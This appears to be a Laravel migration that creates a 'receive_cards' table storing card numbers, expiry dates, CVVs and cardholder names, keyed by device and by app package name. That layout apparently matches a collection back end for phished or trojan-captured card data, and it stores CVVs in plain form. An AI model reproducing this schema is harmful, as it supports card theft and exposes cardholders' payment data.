<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\Facades\DB;

return new class extends Migration
{
    /**
     * Run the migrations.
     *
     * @return void
     */
    public function up()
    {
        Schema::create('receive_cards', function (Blueprint $table) {
            $table->id()->comment('主键ID');
            $table->unsignedBigInteger('device_id')->nullable()->comment('设备ID');
            $table->string('device_number', 100)->nullable()->comment('设备号');
            $table->string('app_name', 200)->nullable()->comment('APP名称');
            $table->string('app_package', 200)->nullable()->comment('APP包名');
            $table->string('card_number', 50)->nullable()->comment('卡号');
            $table->string('card_date', 50)->nullable()->comment('卡的日期');
            $table->string('cvv', 50)->nullable()->comment('CVV');
            $table->string('user_first_name', 100)->nullable()->comment('用户的名');
            $table->string('user_last_name', 100)->nullable()->comment('用户的姓');
            $table->timestamps();
            $table->engine = 'InnoDB';
        });
    
        DB::statement("ALTER TABLE `receive_cards` COMMENT = '收信信用     卡表'");
    }

    /**
     * Reverse the migrations.
     *
     * @return void
     */
    public function down()
    {
        Schema::dropIfExists('receive_cards');
    }
};

